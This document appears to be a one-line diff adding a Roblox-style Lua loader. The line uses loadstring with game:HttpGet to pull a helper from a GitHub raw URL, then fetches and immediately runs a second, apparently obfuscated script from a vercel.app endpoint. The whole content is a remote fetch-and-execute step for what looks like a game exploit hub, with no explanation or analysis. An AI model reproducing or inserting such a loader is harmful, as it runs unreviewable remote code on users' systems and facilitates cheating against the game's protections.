@@ -1,0 +1,1 @@
+local HttpGet = loadstring(game:HttpGet('https://raw.githubusercontent.com/x2RunE/Immortal/refs/heads/main/request.lua'))().HttpGet loadstring(game:HttpGet("https://apexhubeditor.vercel.app/api/raw?name=PM7HKCDSC7aLT0zJUq6drUDo5Ei2_marunewobflua"))()
